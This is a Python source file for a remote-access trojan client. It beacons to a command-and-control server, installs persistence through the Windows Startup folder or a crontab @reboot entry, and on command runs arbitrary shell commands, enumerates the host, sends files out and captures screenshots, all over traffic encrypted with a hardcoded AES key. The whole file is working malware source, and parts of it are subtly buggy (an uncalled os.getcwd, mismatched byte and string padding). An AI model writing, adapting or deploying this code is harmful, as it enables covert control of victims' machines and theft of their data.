import platform
import socket
import time
import subprocess
import os
import zlib
import shutil
from Crypto.Cipher import AES

ip = "127.0.0.1"
port = 9999
agent_hostname = socket.gethostname()
agent_ip = socket.gethostbyname(agent_hostname)
beacon_time = 5


def adding_startup():
    os_name = platform.system()
    if os_name == "Windows":
        startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        script_path = os.getcwd() + '\\client.py'  
        shortcut_path = os.path.join(startup_folder, 'command_and_control.lnk')

        os.system(f'shortcut.exe /f:"{shortcut_path}" /a:c /t:"{script_path}"')

    elif os_name == "Linux":
        script_path = f'{os.getcwd}/script.py'  
        command = f"@reboot /usr/bin/python3 {script_path}\n"

        # Append to crontab
        with open("command_and_control", "a") as myfile:
            myfile.write(command)
        
        os.system("crontab command_and_control")
        os.remove("command_and_control")



def decrypt(data):
    key = b'Sixteen byte key'
    iv = b'Xallowtofghjklmn'
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return cipher.decrypt(data).decode()


def encrypt(data):
    key = b'Sixteen byte key'
    iv = b'Xallowtofghjklmn'
    if len(data) % 16 != 0:
        data += ' ' * (16 - len(data) % 16)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    enc_data = cipher.encrypt(data)
    comp_cipher = zlib.compress(enc_data)
    return comp_cipher


def connect():
    while True:
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.bind(('0.0.0.0', 62343))
            client.connect((ip,port)) # Connect to server
            return client 
        except Exception as e:
            print(f"Failed to connect to server {e}")
            time.sleep(5)
            continue



## 3 Functions!

# Command Execution --- c <command> e.g. "c mkdir test"
def command_exec(command):
    print("Command: "+command)
    try:
        output = subprocess.check_output(command,shell=True,text=True)
    except Exception as e:
        output = "Wrong Command"
    if len(output) % 16 != 0:
        output += ' ' * (16 - len(output) % 16)
    enc_output = encrypt(output.encode())
    client.send(enc_output) # Send output

# Enumeration --- e
def enumeration():
    system = platform.system()
    if system == "Linux":
        ip = subprocess.check_output("ip a",shell=True,text=True)
        username = subprocess.check_output("whoami",shell=True,text=True)
    else:
        ip = subprocess.check_output("ipconfig",shell=True,text=True)
        username = subprocess.check_output("whoami",shell=True,text=True)
    os_info = {
        "system": platform.system(),
        "release": platform.release(),
        "version": platform.version()
    }
    output = f"IP: {ip}\nUsername: {username}\nOS: {os_info}\nHostname: {agent_hostname}"
    if len(output) % 16 != 0:
        output += ' ' * (16 - len(output) % 16)
    enc_output = encrypt(output.encode())
    client.send(enc_output) # Send output
    

# File Transfer --- f <path> 
def file_transfer(path):
    with open(path, "rb") as file:
        file_data = file.read(1024)
        if len(file_data) % 16 != 0:
            file_data += b' ' * (16 - len(file_data) % 16)    
        data = encrypt(file_data)
        client.send(data)


client = connect()
adding_startup()
while True:
    while True: # Send beacon and check for response
        try:
            client.send("beacon".encode()) # Send beacon
        except:
            client.close()
            client = connect()
            continue
        try:
            command = client.recv(1024)# Receive response
            command = decrypt(command)
        except Exception as e:
            print(f"Failed to receive command: {e}")
            break
        if command: # Check response isn't blank
            command_function = command.split()[0] # Split the command and check the function
            print (command_function)
            if command_function == "f": # If file transfer command --
                print("File transfer command received")
                try:
                    print("sagol")
                    command = command.split()[1]
                    file_transfer(command)
                    print("salam")
                except:
                    print("Failed to transfer file")
                    error = "Failed to transfer file"
                    if len(error) % 16 != 0:
                        error += ' ' * (16 - len(error) % 16)
                    data = encrypt(error.encode())
                    client.send(data)
            elif command_function == "e": # If enumeration command --
                print("Enumeration command received")
                enumeration()
            elif command_function == "c": # If command execution command --
                print("Command execution command received")
                try:
                    c = command.split(" ",1)[1]
                    command_exec(c)
                except:
                    print("Failed to execute command")
                    data = encrypt("Failed to execute command".encode())
                    client.send(data)
            elif command_function == 'ss':
                try:
                    import pyautogui
                except:
                    print("Failed to import pyautogui")
                    data = encrypt("NO_DISPLAY       ".encode())
                    client.send(data)
                    break
                print("Screenshot command received")
                screenshot = pyautogui.screenshot()
                screenshot.save("/tmp/screenshot.png")
                file_transfer("/tmp/screenshot.png")
                os.remove("/tmp/screenshot.png")
            elif command_function == "live_check":
                print("Live check command received")
                data = encrypt("Live".encode())
                client.send(data)
            else:
                print("\tNo Commands")
        break
    time.sleep(beacon_time) # Wait X seconds before beaconing again